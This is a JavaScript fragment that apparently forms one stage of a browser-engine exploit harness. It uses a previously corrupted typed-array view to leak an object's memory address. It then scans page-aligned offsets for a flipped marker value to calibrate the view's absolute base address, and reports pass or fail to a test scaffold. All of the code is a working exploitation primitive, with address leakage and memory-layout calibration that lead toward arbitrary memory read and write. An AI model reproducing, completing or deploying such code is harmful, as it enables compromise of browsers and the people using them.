// Find a live object only at indices consistent with a page-aligned view base.
// The marker mutation distinguishes the rooted object from stale equal bytes.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_anchor_preflight_failed");
  var view = state.view;
  var bytes = [];
  try {
    state.array[0] = state.addressAnchor;
    for (var b = 0; b < 8; b++) bytes.push(view[state.index + b]);
  } finally {
    state.array[0] = state.a;
  }
  var hex = "0x";
  for (var h = 7; h >= 0; h--)
    hex += bytes[h].toString(16).padStart(2, "0");
  var word = Number(hex);
  if (!Number.isSafeInteger(word) || word < 0x200000000)
    throw new Error("anchor_word_invalid");
  var residue = (word + 8) % 4096;
  var limit = Math.min(view.length - 4, 6 * 1024 * 1024);
  if (limit < residue || limit < 2097152)
    throw new Error("view_too_short");
  if (api && typeof api.markSync === "function")
    api.markSync("sparse_base_preflight");
  phase = "sparse_scan";
  var sampled = 0;
  var candidateCount = 0;
  var liveIndex = -1;
  for (var index = residue; index <= limit; index += 4096) {
    sampled++;
    if (index >= 2097152 && index < 2097152 + 4096 &&
        api && typeof api.markSync === "function")
      api.markSync("sparse_base_2m");
    if (index >= 4194304 && index < 4194304 + 4096 &&
        api && typeof api.markSync === "function")
      api.markSync("sparse_base_4m");
    if (view[index] !== 0x44 || view[index + 1] !== 0x33 ||
        view[index + 2] !== 0x22 || view[index + 3] !== 0x11)
      continue;
    candidateCount++;
    var live = false;
    try {
      state.addressAnchor.marker = 0x55667788;
      live = view[index] === 0x88 && view[index + 1] === 0x77 &&
        view[index + 2] === 0x66 && view[index + 3] === 0x55;
    } finally {
      state.addressAnchor.marker = 0x11223344;
    }
    if (live) {
      liveIndex = index;
      break;
    }
  }
  var base = liveIndex >= 0 ? word + 8 - liveIndex : 0;
  var restored = state.array[0] === state.a &&
    state.addressAnchor.marker === 0x11223344;
  var valid = liveIndex >= 0 && Number.isSafeInteger(base) &&
    base > 0 && base % 4096 === 0 && restored;
  if (valid) state.calibratedViewBase = base;
  result = { id: "sparse_base_calibration_v1",
    status: valid ? "pass" : "fail",
    details: { anchor_word: hex, residue: residue, limit: limit,
      sampled: sampled, candidates: candidateCount,
      live_index: liveIndex, base: valid ? "0x" + base.toString(16) : null,
      restored: restored } };
} catch (error) {
  if (state && state.array && state.a) state.array[0] = state.a;
  if (state && state.addressAnchor)
    state.addressAnchor.marker = 0x11223344;
  result = { id: "sparse_base_calibration_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 200) } };
}
return [result];
